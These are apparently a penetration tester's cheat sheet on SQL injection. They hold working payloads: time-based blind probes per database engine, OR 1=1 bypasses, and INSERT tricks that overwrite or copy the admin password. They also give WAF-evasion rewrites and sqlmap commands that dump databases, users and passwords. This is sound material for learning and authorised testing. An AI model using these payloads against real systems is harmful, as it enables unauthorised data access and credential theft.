#  Detecting SQLi
- Is the server going to query a database containing my input?
	- If so/you suspect so, TEST!


#  Testing your target
1. Break the server
	- Send inputs that cause errors - ', \", \`, ...
2. Fix the error and get a valid SQL with injection! - \' OR 1=1-- -

#  Testing your target - Blind?
- Send sleep statement, See if server waits!
	- MySQL - \'+sleep(10)
	- PostgreSQL - \'||pg_sleep(10)
	- MSSQL - \'WAITFOR DELAY '0:0:10'
	- Oracle - \'AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
	- SQLite - \'1 AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))

#  Identify Backend
- MySQL - \‘ + sleep(10) conv('a',16,2)=conv('a',16,2) connection_id=connection_id crc32('MySQL')=crc32('MySQL')
- Oracle - \' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10) ROWNUM=ROWNUM RAWTOHEX('AB')=RAWTOHEX('AB')
- PostgreSQL - \'||pg_sleep(10) 5::int=5 pg_client_encoding()=pg_client_encoding()
- SQLite - 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) sqlite_version()=sqlite_version()
- MSACCESS - val(cvar(1))=1 IIF(ATN(2)>0,1,0)BETWEEN 2 AND 0 cdbl(1)=cdbl(1)
- MSSQL - \'WAITFOR DELAY '0:0:10'

#  Comments in backends
- MySQL - \#c, --c, \/\*c\*\/
- Oracle - --c
- PostgreSQL - --c, \/\*c\*\/
- SQLite - --c, \/\*c\*\/
- MSSQL - --c, \/\*c\*\/

#  Types of SQLi
##  UNION BASED
- The **UNION** keyword is used to link SELECT statements together.
- But both SELECT statements need to select the same amound of columns!
- Find out the number of columns in the select statement
- Extract information!


##  BLIND, ERROR, BOOLEAN AND TIME BASED
- Blind: no visual output, but way to differentiate between true and false query
- Error: No visual output but way to differentiate between error or not in query
- Boolean: Visual difference between true or false result
- Time: No visual output but way to change the time the server takes to respond

##  INSERT INTO BASED
- Databases can not only query but also insert data
- Think about registration forms, etc...
- MySQL Truncation Attack - 
	- MySQL will truncate spaces from fields
	- So \'admin will become 'admin'
	- We can use this to overwrite admin credentials
- On Duplicate Key - 
	- In MySQL, ON DUPLICATE KEY, states what to do when something is already present.
	- INSERT INTO users VALUES("pink","safepass"), ("admin","safepass") ON DUPLICATE KEY UPDATE password="safepass"
- Information Extraction - 
	- We create another user named data with the admin password as email
	- INSERT INTO users VALUES("pink","my@mail.com"), ("data", (SELECT password FROM users WHERE user="admin"));


##  OTHER
- Stacked Queries
	- Uncommon
	- We can stack queries: Query1; Query2
	- The output of query 2 won't be shown BUT can be used in blind SQLi.
- Out of band
	- Very uncommon
	- If the databse can make DNS or HTTP requests, we use those send data
	- Check [this](https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b) out for more.
- Routed SQLi
	- Extremely uncommon
	- If we have a scenario where the result of our query is being used in another query.
	- Check [this](http://www.securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html) out for more


#  WAF Bypass
- No Whitespace using comments 
	- '/\*\*/OR/\*\*/1=1/\*\*/--
- No whitespace using parenthesis  
	- 'AND(1)=(1)--
- No Equal using LIKE, (NOT) IN, BETWEEN 
	- 'text' LIKE 'text' 
	- 'text' IN 'text'
	- 'b' BETWEEN 'a' AND 'c'
- No AND or OR
	- && and ||
- No > or <
	- NOT BETWEEN n AND m
- No Where
	- HAVING
- No comma
	```
	LIMIT 0,1=>LIMIT 1 OFFSET 0
	SUBSTR('ABC',1,1)=>SUBSTR('ABC' FROM 1 FOR 1)
	SELECT 1,2,3 => UNION SELECT * 
	FROM (SELECT 1)a 
	JOIN(SELECT 2)b
	JOIN(SELECT 3)c
	```
- No information_schema.tables
	- `SELECT * FROM mysql.innodb_table_stats;`
	- `SHOW TABLES in db`


#  SQLMap
- Tool
- Automates detecting & exploiting SQLi
- Easy to use
- Extremely tuneable

##  Basic SQLMap Usage
- Simple run
	- sqlmap --url \<\<URL\>\>
- Using a request file saved from BURP or somewhere else
	- sqlmap -r file.req
- More parameters
	- -p "Parameter to test"
	- --risk 3
	- --level 5
	- --dbms "DBMS systems"
	- ..(use -hh for more)

## SQLMap Retrieve Data
- Database Data
	- Retrieve everything: --all
	- Names of the dbs: --dbs
	- --tables -D DB
	- --columns -T table -D DB
	- Dump column: -D DB -T table -C column
- Internal information
	- --current-user
	- -is-dba(is db admin)
	- --hostname
	- --users
	- --passwords
	- --privileges

